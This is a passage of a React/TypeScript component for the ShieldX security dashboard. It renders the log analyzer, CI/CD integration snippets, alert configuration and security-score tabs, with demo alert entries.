                              <span className="font-medium w-48 shrink-0">{c.name}</span>
                              <span className="text-muted-foreground flex-1">{c.message}</span>
                              <div className="flex items-center gap-1.5">
                                {c.owaspRef && (
                                  <Badge variant="outline" className="text-[10px] bg-violet-500/10 text-violet-500 border-violet-500/30">{c.owaspRef}</Badge>
                                )}
                                <Badge variant="outline" className={`text-[10px] ${severityColor(c.severity)}`}>{c.severity}</Badge>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* ═══ LOG ANALYZER ═══ */}
            {activeTab === "logs" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Brain className="h-5 w-5 text-purple-500" />
                    AI Threat Log Analyzer
                    <Badge variant="outline" className="ml-2 text-xs">7 pattern categories</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Paste application logs, access logs, or syslog output. The analyzer detects brute force attempts,
                    injection attacks, privilege escalation, data exfiltration, error spikes, and suspicious IP activity.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Textarea
                    placeholder={`Paste your logs here...\n\nSupports: application logs, access logs, syslog, error logs\n\nExample:\n2026-03-14 10:15:22 [WARN] Failed login for user admin from 185.143.223.47`}
                    className="font-mono text-sm min-h-[200px]"
                    value={logsInput}
                    onChange={(e) => setLogsInput(e.target.value)}
                  />
                  <Button onClick={runLogsScan} disabled={!logsInput.trim() || logsScanning} className="gap-2">
                    {logsScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Brain className="h-4 w-4" />}
                    {logsScanning ? "Analyzing..." : "Analyze Logs"}
                  </Button>

                  {logsResults !== null && (
                    <div className="mt-6">
                      {logsResults.length === 0 ? (
                        <div className="flex items-center gap-3 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                          <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          <div>
                            <div className="font-semibold text-emerald-600 dark:text-emerald-400">No threats detected</div>
                            <div className="text-sm text-muted-foreground">Logs appear clean. Continue monitoring.</div>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          <div className="flex items-center gap-2">
                            <Activity className="h-5 w-5 text-purple-500" />
                            <span className="font-bold text-purple-500">{logsResults.length} threat(s) identified</span>
                          </div>
                          {logsResults.map((f, i) => (
                            <div key={i} className={`rounded-lg border p-4 ${severityBg(f.severity)}`}>
                              <div className="flex items-center justify-between mb-2">
                                <span className="font-semibold text-sm">{f.type}</span>
                                <Badge variant={f.severity === "critical" ? "destructive" : "outline"} className="text-xs">{f.severity}</Badge>
                              </div>
                              <p className="text-sm mb-2">{f.details}</p>
                              <div className="font-mono text-xs bg-background/50 rounded px-3 py-2 mb-2 whitespace-pre-wrap">{f.evidence}</div>
                              <div className="flex items-start gap-2 text-sm">
                                <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {f.fix}</span>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* ═══ CI/CD INTEGRATION ═══ */}
            {activeTab === "cicd" && (
              <div className="space-y-6">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2">
                      <GitBranch className="h-5 w-5 text-teal-500" />
                      CI/CD Pipeline Integration
                      <Badge variant="outline" className="ml-2 text-xs">GitHub Actions • GitLab CI • cURL</Badge>
                    </CardTitle>
                    <p className="text-sm text-muted-foreground">
                      Add ShieldX security scanning to your CI/CD pipeline. Scans run via our webhook API and return
                      pass/fail verdicts with exit codes for automated gating.
                    </p>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {/* GitHub Actions */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <h4 className="text-sm font-bold flex items-center gap-2">
                          <Code className="h-4 w-4" /> GitHub Actions
                        </h4>
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1.5 text-xs"
                          onClick={() => copyToClipboard(GITHUB_ACTIONS_YAML, "github")}
                        >
                          {copiedSnippet === "github" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                          {copiedSnippet === "github" ? "Copied!" : "Copy"}
                        </Button>
                      </div>
                      <pre className="bg-muted/50 border rounded-lg p-4 text-xs font-mono overflow-x-auto max-h-[300px]">
                        {GITHUB_ACTIONS_YAML}
                      </pre>
                    </div>

                    {/* GitLab CI */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <h4 className="text-sm font-bold flex items-center gap-2">
                          <Code className="h-4 w-4" /> GitLab CI
                        </h4>
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1.5 text-xs"
                          onClick={() => copyToClipboard(GITLAB_CI_YAML, "gitlab")}
                        >
                          {copiedSnippet === "gitlab" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                          {copiedSnippet === "gitlab" ? "Copied!" : "Copy"}
                        </Button>
                      </div>
                      <pre className="bg-muted/50 border rounded-lg p-4 text-xs font-mono overflow-x-auto max-h-[300px]">
                        {GITLAB_CI_YAML}
                      </pre>
                    </div>

                    {/* cURL / Generic */}
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <h4 className="text-sm font-bold flex items-center gap-2">
                          <Terminal className="h-4 w-4" /> cURL / Any CI System
                        </h4>
                        <Button
                          variant="outline"
                          size="sm"
                          className="gap-1.5 text-xs"
                          onClick={() => copyToClipboard(CURL_EXAMPLE, "curl")}
                        >
                          {copiedSnippet === "curl" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3" />}
                          {copiedSnippet === "curl" ? "Copied!" : "Copy"}
                        </Button>
                      </div>
                      <pre className="bg-muted/50 border rounded-lg p-4 text-xs font-mono overflow-x-auto max-h-[300px]">
                        {CURL_EXAMPLE}
                      </pre>
                    </div>
                  </CardContent>
                </Card>

                {/* Test Webhook */}
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2 text-lg">
                      <Send className="h-5 w-5 text-teal-500" />
                      Test Webhook
                    </CardTitle>
                    <p className="text-sm text-muted-foreground">
                      Run a live test against the CI/CD webhook endpoint using sample vulnerable code.
                    </p>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="flex items-center gap-3">
                      <Button onClick={runCicdTest} disabled={cicdTesting} className="gap-2">
                        {cicdTesting ? <Loader2 className="h-4 w-4 animate-spin" /> : <Play className="h-4 w-4" />}
                        {cicdTesting ? "Testing..." : "Run Test Scan"}
                      </Button>
                      <span className="text-sm text-muted-foreground">
                        POST /api/shieldx/ci-scan
                      </span>
                    </div>

                    {cicdTestResult && (
                      <div className={`rounded-lg border p-4 ${cicdTestResult.verdict === "PASS" ? "bg-emerald-500/10 border-emerald-500/20" : "bg-red-500/10 border-red-500/20"}`}>
                        <div className="flex items-center gap-3 mb-2">
                          {cicdTestResult.verdict === "PASS" ? (
                            <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          ) : (
                            <XCircle className="h-5 w-5 text-red-500" />
                          )}
                          <span className="font-bold text-lg">
                            Verdict: {cicdTestResult.verdict}
                          </span>
                          <Badge variant={cicdTestResult.exitCode === 0 ? "outline" : "destructive"} className="text-xs">
                            Exit Code: {cicdTestResult.exitCode}
                          </Badge>
                        </div>
                        <pre className="bg-background/50 rounded p-3 text-xs font-mono overflow-x-auto">
                          {JSON.stringify(cicdTestResult, null, 2)}
                        </pre>
                      </div>
                    )}

                    <div className="rounded-lg border border-border p-4 bg-muted/30">
                      <h5 className="text-sm font-medium mb-2">How it works:</h5>
                      <ul className="text-sm text-muted-foreground space-y-1">
                        <li className="flex items-start gap-2"><CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" /> Accepts POST with code or dependency manifest</li>
                        <li className="flex items-start gap-2"><CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" /> Runs entropy-based secrets scan or OSV dependency check</li>
                        <li className="flex items-start gap-2"><CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" /> Returns PASS/FAIL verdict with exit code 0 or 1</li>
                        <li className="flex items-start gap-2"><CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" /> CI/CD pipeline gates deployment on exit code</li>
                      </ul>
                    </div>
                  </CardContent>
                </Card>
              </div>
            )}

            {/* ═══ ALERTS & NOTIFICATIONS ═══ */}
            {activeTab === "alerts" && (
              <div className="space-y-6">
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2">
                      <Bell className="h-5 w-5 text-amber-500" />
                      Alert Configuration
                      <Badge variant="outline" className="ml-2 text-xs">Email • Slack • Webhooks</Badge>
                    </CardTitle>
                    <p className="text-sm text-muted-foreground">
                      Configure notifications when security issues are detected. Get alerts via email, Slack, or custom webhooks.
                    </p>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {/* Notification Channels */}
                    <div className="grid sm:grid-cols-3 gap-4">
                      <div className="space-y-2">
                        <label className="text-sm font-medium flex items-center gap-2">
                          <Mail className="h-4 w-4" /> Email
                        </label>
                        <Input
                          placeholder="security@company.com"
                          value={alertEmail}
                          onChange={(e) => { setAlertEmail(e.target.value); setAlertSaved(false); }}
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-medium flex items-center gap-2">
                          <MessageSquare className="h-4 w-4" /> Slack Webhook
                        </label>
                        <Input
                          placeholder="https://hooks.slack.com/services/..."
                          value={alertSlackWebhook}
                          onChange={(e) => { setAlertSlackWebhook(e.target.value); setAlertSaved(false); }}
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-medium flex items-center gap-2">
                          <Send className="h-4 w-4" /> Custom Webhook
                        </label>
                        <Input
                          placeholder="https://api.company.com/webhooks/security"
                          value={alertCustomWebhook}
                          onChange={(e) => { setAlertCustomWebhook(e.target.value); setAlertSaved(false); }}
                        />
                      </div>
                    </div>

                    {/* Threshold */}
                    <div>
                      <label className="text-sm font-medium mb-2 block">Alert Threshold</label>
                      <div className="flex gap-2">
                        {([
                          { value: "critical" as const, label: "Critical Only", desc: "Only critical severity" },
                          { value: "high" as const, label: "Critical + High", desc: "Critical and high severity" },
                          { value: "all" as const, label: "All Severities", desc: "All findings" },
                        ]).map((opt) => (
                          <button
                            key={opt.value}
                            onClick={() => { setAlertThreshold(opt.value); setAlertSaved(false); }}
                            className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${
                              alertThreshold === opt.value
                                ? "bg-primary text-primary-foreground"
                                : "bg-muted text-muted-foreground hover:bg-muted/80"
                            }`}
                          >
                            {opt.label}
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Save / Test */}
                    <div className="flex gap-3">
                      <Button
                        className="gap-2"
                        onClick={() => {
                          setAlertSaved(true);
                          setTimeout(() => setAlertSaved(false), 3000);
                        }}
                        disabled={!alertEmail && !alertSlackWebhook && !alertCustomWebhook}
                      >
                        <Settings className="h-4 w-4" />
                        {alertSaved ? "Saved!" : "Save Configuration"}
                      </Button>
                      <Button
                        variant="outline"
                        className="gap-2"
                        onClick={() => {
                          setAlertTestSent(true);
                          setTimeout(() => setAlertTestSent(false), 3000);
                        }}
                        disabled={!alertEmail && !alertSlackWebhook && !alertCustomWebhook}
                      >
                        <Send className="h-4 w-4" />
                        {alertTestSent ? "Test Sent!" : "Send Test Alert"}
                      </Button>
                    </div>

                    {alertSaved && (
                      <div className="flex items-center gap-2 p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-600 dark:text-emerald-400 text-sm">
                        <CheckCircle2 className="h-4 w-4" />
                        Alert configuration saved. You&apos;ll receive notifications for {alertThreshold === "critical" ? "critical" : alertThreshold === "high" ? "critical and high" : "all"} severity findings.
                      </div>
                    )}

                    {alertTestSent && (
                      <div className="flex items-center gap-2 p-3 rounded-lg bg-blue-500/10 border border-blue-500/20 text-blue-600 dark:text-blue-400 text-sm">
                        <Bell className="h-4 w-4" />
                        Test alert dispatched to configured channels.
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Alert Rules */}
                <Card>
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2 text-lg">
                      <Settings className="h-5 w-5 text-amber-500" />
                      Alert Rules
                    </CardTitle>
                    <p className="text-sm text-muted-foreground">
                      Enable or disable specific alert rules. Active rules trigger notifications based on your threshold setting.
                    </p>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      {alertRules.map((rule) => (
                        <div key={rule.id} className={`rounded-lg border p-4 transition-colors ${
                          rule.enabled ? "border-primary/20 bg-primary/5" : "border-border opacity-60"
                        }`}>
                          <div className="flex items-center justify-between">
                            <div className="flex-1">
                              <div className="flex items-center gap-2 mb-1">
                                <span className="font-medium text-sm">{rule.name}</span>
                                <Badge variant={rule.severity === "critical" ? "destructive" : "outline"} className="text-[10px]">
                                  {rule.severity}
                                </Badge>
                              </div>
                              <p className="text-xs text-muted-foreground">{rule.description}</p>
                            </div>
                            <button
                              onClick={() => setAlertRules((prev) => prev.map((r) => r.id === rule.id ? { ...r, enabled: !r.enabled } : r))}
                              className={`relative w-11 h-6 rounded-full transition-colors ${
                                rule.enabled ? "bg-primary" : "bg-muted"
                              }`}
                            >
                              <span className={`absolute top-0.5 left-0.5 w-5 h-5 rounded-full bg-white transition-transform ${
                                rule.enabled ? "translate-x-5" : "translate-x-0"
                              }`} />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>

                {/* Sample Alert History */}
                {isDemo && (
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2 text-lg">
                        <Activity className="h-5 w-5 text-amber-500" />
                        Recent Alerts (Demo)
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="space-y-2">
                        {[
                          { time: "2 min ago", type: "Critical Secrets Detected", detail: "3 high-confidence secrets found in config/database.ts", severity: "critical" },
                          { time: "2 min ago", type: "Critical CVE in Dependencies", detail: "shell-quote v1.7.2 — CVE-2021-42740 Command Injection", severity: "critical" },
                          { time: "3 min ago", type: "Injection Attacks in Logs", detail: "SQL injection and XSS patterns detected from 45.33.32.156", severity: "critical" },
                          { time: "3 min ago", type: "Cloud Security Failures", detail: "8 checks failing across AWS, GCP, Azure", severity: "high" },
                        ].map((alert, i) => (
                          <div key={i} className={`flex items-start gap-3 p-3 rounded-lg border ${severityBg(alert.severity)}`}>
                            <Bell className={`h-4 w-4 mt-0.5 shrink-0 ${severityColor(alert.severity)}`} />
                            <div className="flex-1">
                              <div className="flex items-center gap-2">
                                <span className="text-sm font-medium">{alert.type}</span>
                                <Badge variant={alert.severity === "critical" ? "destructive" : "outline"} className="text-[10px]">{alert.severity}</Badge>
                              </div>
                              <p className="text-xs text-muted-foreground">{alert.detail}</p>
                            </div>
                            <span className="text-xs text-muted-foreground shrink-0">{alert.time}</span>
                          </div>
                        ))}
                      </div>
                    </CardContent>
                  </Card>
                )}
              </div>
            )}

            {/* ═══ SECURITY SCORE ═══ */}
            {activeTab === "score" && (
              <div className="space-y-6">
                <Card className="border-2 border-primary/20">
                  <CardContent className="p-8">
                    <div className="grid lg:grid-cols-2 gap-8 items-center">
                      <div className="text-center lg:text-left">
                        <h2 className="text-lg font-bold text-muted-foreground mb-2">Overall Security Score</h2>
                        <div className="text-7xl font-extrabold">
                          <span className={
                            scores.overall >= 8 ? "text-emerald-500" :
                            scores.overall >= 6 ? "text-yellow-500" :
                            scores.overall >= 4 ? "text-orange-500" :
                            "text-red-500"
                          }>
                            {scores.overall}
                          </span>
                          <span className="text-2xl text-muted-foreground">/10</span>
                        </div>
                        <p className="text-sm text-muted-foreground mt-2">
                          {scores.overall >= 8 ? "Excellent — your security posture is strong" :
                           scores.overall >= 6 ? "Fair — some issues need attention" :
                           scores.overall >= 4 ? "Poor — multiple vulnerabilities found" :
                           "Critical — immediate action required"}
                        </p>
                        {!hasAnyResults && (
                          <p className="text-sm text-muted-foreground mt-4 italic">
                            Run scanners in other tabs or click &quot;Run Full Demo&quot; to see a real score.
                          </p>
                        )}
                      </div>

                      <div className="h-[280px]">
                        <ResponsiveContainer width="100%" height="100%">
                          <RadarChart data={radarData}>
                            <PolarGrid stroke="hsl(var(--border))" />
                            <PolarAngleAxis dataKey="category" tick={{ fill: "hsl(var(--muted-foreground))", fontSize: 12 }} />
                            <PolarRadiusAxis angle={90} domain={[0, 10]} tick={{ fill: "hsl(var(--muted-foreground))", fontSize: 10 }} />
                            <Radar name="Score" dataKey="score" stroke="hsl(var(--primary))" fill="hsl(var(--primary))" fillOpacity={0.3} strokeWidth={2} />
                          </RadarChart>
                        </ResponsiveContainer>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                <div className="grid sm:grid-cols-2 lg:grid-cols-5 gap-4">
                  {[
                    { label: "Secrets", score: scores.secrets, icon: Key, color: "text-red-500", tab: "secrets" as TabKey },
                    { label: "Dependencies", score: scores.deps, icon: Package, color: "text-orange-500", tab: "deps" as TabKey },
                    { label: "Cloud", score: scores.cloud, icon: Cloud, color: "text-sky-500", tab: "cloud" as TabKey },
                    { label: "API", score: scores.api, icon: Globe, color: "text-violet-500", tab: "api" as TabKey },
                    { label: "Logs", score: scores.logs, icon: Brain, color: "text-purple-500", tab: "logs" as TabKey },
                  ].map((cat, i) => (
                    <Card key={i} className="cursor-pointer hover:border-primary/30 transition-colors" onClick={() => setActiveTab(cat.tab)}>
                      <CardContent className="p-4 text-center">
                        <cat.icon className={`h-6 w-6 mx-auto mb-2 ${cat.color}`} />
                        <div className="text-2xl font-bold">{cat.score}<span className="text-sm text-muted-foreground">/10</span></div>
                        <div className="text-sm text-muted-foreground">{cat.label}</div>
                        <div className="mt-2 h-1.5 rounded-full bg-muted overflow-hidden">
                          <div
                            className={`h-full rounded-full transition-all duration-1000 ${
                              cat.score >= 8 ? "bg-emerald-500" : cat.score >= 6 ? "bg-yellow-500" : cat.score >= 4 ? "bg-orange-500" : "bg-red-500"
                            }`}
                            style={{ width: `${cat.score * 10}%` }}
                          />
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>

                {/* Platform Status */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-lg">Platform Modules</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-3">
                      {[
                        { name: "Secrets Scanner", icon: Key, desc: "20 patterns + entropy", active: secretsResults !== null },
                        { name: "Dependency Scanner", icon: Package, desc: "Real-time OSV.dev", active: depsResults !== null },
                        { name: "Cloud Security", icon: Cloud, desc: "18 config checks", active: Object.values(cloudAnswers).some((v) => v !== null) },
                        { name: "API Scanner", icon: Globe, desc: "OWASP API Top 10", active: apiResults !== null },
                        { name: "Log Analyzer", icon: Brain, desc: "7 threat categories", active: logsResults !== null },
                        { name: "CI/CD Integration", icon: GitBranch, desc: "GitHub/GitLab/cURL", active: cicdTestResult !== null },
                        { name: "Alerts", icon: Bell, desc: "Email/Slack/Webhook", active: alertSaved },
                        { name: "Security Score", icon: BarChart3, desc: "Real-time dashboard", active: hasAnyResults },
                      ].map((mod, i) => (
                        <div key={i} className={`flex items-center gap-3 p-3 rounded-lg border ${mod.active ? "border-emerald-500/30 bg-emerald-500/5" : "border-border"}`}>
                          <mod.icon className={`h-5 w-5 shrink-0 ${mod.active ? "text-emerald-500" : "text-muted-foreground"}`} />
                          <div>
                            <div className="text-sm font-medium">{mod.name}</div>
                            <div className="text-xs text-muted-foreground">{mod.desc}</div>
                          </div>
                          {mod.active && <CheckCircle2 className="h-4 w-4 text-emerald-500 ml-auto shrink-0" />}
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>

                {hasAnyResults && (
                  <Card>
                    <CardHeader>
                      <CardTitle className="text-lg">Scan Summary</CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4 text-sm">
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Secrets Found</div>
                          <div className="text-2xl font-bold">{secretsResults ? highConfSecrets.length : "—"}</div>
                          {secretsResults && lowConfSecrets.length > 0 && (
                            <div className="text-xs text-muted-foreground">+{lowConfSecrets.length} low confidence</div>
                          )}
                        </div>
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Vulnerable Packages</div>
                          <div className="text-2xl font-bold">{depsResults?.vulnerabilities.length ?? "—"}</div>
                          {depsResults && <div className="text-xs text-muted-foreground">via {depsResults.source}</div>}
                        </div>
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Cloud Issues</div>
                          <div className="text-2xl font-bold">
                            {Object.values(cloudAnswers).some((v) => v !== null)
                              ? Object.values(cloudAnswers).filter((v) => v === false).length
                              : "—"}
                          </div>
                        </div>
                        <div className="p-3 rounded-lg bg-muted/50">
                          <div className="text-muted-foreground mb-1">Log Threats</div>
                          <div className="text-2xl font-bold">{logsResults?.length ?? "—"}</div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )}

                <div className="text-center py-12">
                  <div className="relative rounded-2xl overflow-hidden border border-border/50 p-8 sm:p-12">
                    <div className="absolute inset-0 bg-gradient-to-r from-primary/[0.03] to-cyan-500/[0.03]" />
                    <div className="relative">
                      <h3 className="text-xl sm:text-2xl font-bold mb-3">Need Help Fixing These Issues?</h3>
                      <p className="text-muted-foreground mb-6 max-w-xl mx-auto">
                        Our security experts can help remediate vulnerabilities, harden your infrastructure, and implement best practices.
                      </p>
                      <div className="flex flex-wrap justify-center gap-3">
                        <Link href="/contact">
                          <Button size="lg" className="gap-2 rounded-xl shadow-sm">Get Expert Help <ArrowRight className="h-4 w-4" /></Button>
                        </Link>
                        <Link href="/services">
                          <Button size="lg" variant="outline" className="gap-2 rounded-xl">View Services</Button>
                        </Link>
                        {!hasPro && (
                          <Link href="/shieldx/pricing">
                            <Button size="lg" variant="outline" className="gap-2 rounded-xl text-primary border-primary/30 hover:bg-primary/5">
                              <Crown className="h-4 w-4" /> Upgrade to Pro
                            </Button>
                          </Link>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            </>
            )}

          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
}
